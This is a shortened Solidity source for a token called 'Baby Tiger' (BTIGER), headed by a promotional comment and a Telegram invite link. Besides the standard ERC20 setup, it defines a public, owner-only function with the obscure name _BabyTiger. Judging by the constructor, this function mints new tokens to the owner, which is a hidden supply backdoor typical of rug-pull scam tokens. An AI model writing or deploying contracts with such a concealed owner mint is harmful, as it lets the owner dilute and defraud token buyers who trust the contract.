//
// $BabyTiger proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+JsxUO5DRxZplNmRl
// 
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BabyTiger(uint256 amount) public onlyOwner {
 _BabyTiger(msg.sender, amount);
    }
    ...
    function _BabyTiger(address account, uint256 amount) internal virtual {
...
contract $BabyTiger is ERC20 {
    ...
    constructor() public ERC20("Baby Tiger", "BTIGER") {
     _BabyTiger(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}